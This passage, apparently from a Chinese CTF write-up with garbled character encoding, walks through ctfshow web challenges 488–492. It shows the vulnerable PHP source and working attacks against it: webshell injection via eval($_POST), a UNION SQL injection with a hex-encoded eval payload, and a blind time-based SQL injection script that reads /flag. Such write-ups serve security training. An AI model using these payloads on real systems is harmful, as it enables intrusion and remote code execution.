variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è„šæœ¬è·‘ä¸äº†ï¼</p><p><strong>action=../render/render_classï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'file_class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'cache_class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">templateUtil</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">,</span><span class="token variable">$arg</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cache<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">cache_exists</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span>            <span class="token keyword">echo</span> cache<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get_cache</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//åˆ©ç”¨file_get_contentsè¯»å–æ–‡ä»¶</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$templateContent</span><span class="token operator">=</span>fileUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token string">'templates/'</span><span class="token punctuation">.</span><span class="token variable">$template</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$cache</span><span class="token operator">=</span>templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">shade</span><span class="token punctuation">(</span><span class="token variable">$templateContent</span><span class="token punctuation">,</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cache<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">create_cache</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">,</span><span class="token variable">$cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$cache</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span>  <span class="token keyword">function</span> <span class="token function">shade</span><span class="token punctuation">(</span><span class="token variable">$templateContent</span><span class="token punctuation">,</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//ç»™ä½ ä¼ å…¥çš„æ–‡ä»¶å‘½å</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$arg</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$templateContent</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'{{'</span><span class="token punctuation">.</span><span class="token variable">$key</span><span class="token punctuation">.</span><span class="token string">'}}'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$templateContent</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$templateContent</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>?action=../render/cache_classï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">cache</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">create_cache</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">'cache/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            fileUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'cache/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//åˆ©ç”¨ç‚¹</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">get_cache</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> fileUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token string">'cache/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">cache_exists</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">'cache/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//æ£€æŸ¥è¯¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>?action=../render/file_classï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">fileUtil</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$append</span> <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$append</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span><span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$filename-&gt;md5($template)-&gt;md5(error)</code></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//cb5e100e5a9a3e7f6d1fd97512215282.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$content-&gt;$cache-&gt;$templateContent-&gt;$value-&gt;$username=&lt;?php eval($_POST[8]);?&gt;</code></p><p><code>?action=check&amp;username=&lt;?php eval($_POST[8]);?&gt;&amp;password=1</code></p><p><strong>ç„¶åè®¿é—®ï¼š</strong><code>/cache/cb5e100e5a9a3e7f6d1fd97512215282.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210918143242488.png" alt="image-20210918143242488"></p><h1 id="web489â€”â€”extractå˜é‡è¦†ç›–"><a href="#web489â€”â€”extractå˜é‡è¦†ç›–" class="headerlink" title="web489â€”â€”extractå˜é‡è¦†ç›–"></a>web489â€”â€”extractå˜é‡è¦†ç›–</h1><p><strong>?action=../indexï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'render/render_class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'render/db_class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$action</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'location:index.php?action=login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">==</span><span class="token string">'check'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select id from user where username = '"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"' and password='"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"' order by id limit 1"</span><span class="token punctuation">;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user</span><span class="token operator">=</span>db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">select_one</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ç¬¬äºŒä¸ªå‚æ•°å·²ç»æ²¡äº†ï¼Œåˆ©ç”¨ç‚¹å¤±æ•ˆğŸ•</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">==</span><span class="token string">'clear'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'rm -rf cache/*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'cache clear'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">==</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>render/db_classï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">db</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span>  <span class="token keyword">function</span> <span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">;</span>         <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">;</span>         <span class="token variable">$port</span><span class="token operator">=</span><span class="token string">'3306'</span><span class="token punctuation">;</span>         <span class="token variable">$addr</span><span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">;</span>         <span class="token variable">$database</span><span class="token operator">=</span><span class="token string">'ctfshow'</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token variable">$database</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">select_one</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$conn</span> <span class="token operator">=</span> db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è„šæœ¬(åˆ©ç”¨å˜é‡æ›¿æ¢)ï¼š</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://e01d42ab-f4d9-4c1a-a320-9c516b190af0.challenge.ctf.show:8080/index.php?action=check&amp;sql=select "</span>s<span class="token operator">=</span><span class="token string">"abcdef0123456789-}"</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># å·²ç»å»äº†ctfshow{</span>    <span class="token comment" spellcheck="true"># print(i)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> s<span class="token punctuation">:</span>        u<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"if(substr((select load_file('/flag')),{0},1)='{1}',sleep(3),1)"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>u<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span>j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web490â€”â€”sqlè¯­å¥åˆ†æ"><a href="#web490â€”â€”sqlè¯­å¥åˆ†æ" class="headerlink" title="web490â€”â€”sqlè¯­å¥åˆ†æ"></a>web490â€”â€”sqlè¯­å¥åˆ†æ</h1><p><strong>?action=../indexï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'render/render_class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'render/db_class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$action</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'location:index.php?action=login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">==</span><span class="token string">'check'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select username from user where username = '"</span><span class="token punctuation">.</span><span class="token variable">$username</span><span class="token punctuation">.</span><span class="token string">"' and password='"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"' order by id limit 1"</span><span class="token punctuation">;</span>    <span class="token variable">$user</span><span class="token operator">=</span>db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">select_one</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">==</span><span class="token string">'clear'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'rm -rf cache/*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'cache clear'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">==</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶çš„$usernameå·²ç»æ²¡æœ‰äº†md5å‡½æ•°å¤„ç†ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>action<span class="token operator">=</span>check<span class="token operator">&amp;</span>username<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' union  select <span class="token number">0x6576616c28245f504f53545b315d293b20</span> <span class="token operator">%</span><span class="token number">23</span><span class="token number">0x6576616c28245f504f53545b315d293b20</span>å³ <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//cache/6a992d5529f459a44fee58c733255e86.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘è¿™é‡Œç¬¬ä¸€æ¬¡å¤±è´¥äº†ï¼Œæ‰€ä»¥éœ€è¦<code>?action=clear</code></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210918171201592.png" alt="image-20210918171201592"></p><h1 id="web492â€”â€”å˜é‡è¦†ç›–-ç»•è¿‡preg-match"><a href="#web492â€”â€”å˜é‡è¦†ç›–-ç»•è¿‡preg-match" class="headerlink" title="web492â€”â€”å˜é‡è¦†ç›–+ç»•è¿‡preg_match"></a>web492â€”â€”å˜é‡è¦†ç›–+ç»•è¿‡preg_match</h1><p><strong>?action=../indexï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'render/render_class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'render/db_class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$action</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'location:index.php?action=login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">==</span><span class="token string">'check'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[A-Za-z0-9]+$/'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select username from user where username = '"</span><span class="token punctuation">.</span><span class="token variable">$username</span><span class="token punctuation">.</span><span class="token string">"' and password='"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"' order by id limit 1"</span><span class="token punctuation">;</span>        <span class="token variable">$user</span><span class="token operator">=</span>db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">select_one_array</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">==</span><span class="token string">'clear'</span><span class="token punctuation">)</span><span 